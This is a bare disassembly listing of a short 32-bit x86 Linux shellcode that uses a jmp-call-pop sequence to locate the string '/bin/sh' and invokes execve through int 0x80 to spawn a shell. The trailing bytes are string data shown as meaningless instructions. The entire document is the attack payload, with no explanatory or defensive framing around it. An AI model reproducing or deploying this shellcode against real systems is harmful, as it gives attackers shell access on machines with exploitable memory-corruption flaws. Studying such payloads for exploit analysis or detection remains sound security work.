00000000  EB16              jmp short 0x18
00000002  5B                pop ebx
00000003  31C0              xor eax,eax
00000005  891B              mov [ebx],ebx
00000007  894304            mov [ebx+0x4],eax
0000000A  88430F            mov [ebx+0xf],al
0000000D  89D9              mov ecx,ebx
0000000F  83C308            add ebx,byte +0x8
00000012  31D2              xor edx,edx
00000014  B00B              mov al,0xb
00000016  CD80              int 0x80
00000018  E8E5FFFFFF        call 0x2
0000001D  41                inc ecx
0000001E  41                inc ecx
0000001F  41                inc ecx
00000020  41                inc ecx
00000021  42                inc edx
00000022  42                inc edx
00000023  42                inc edx
00000024  42                inc edx
00000025  2F                das
00000026  62696E            bound ebp,[ecx+0x6e]
00000029  2F                das
0000002A  7368              jnc 0x94
0000002C  44                inc esp
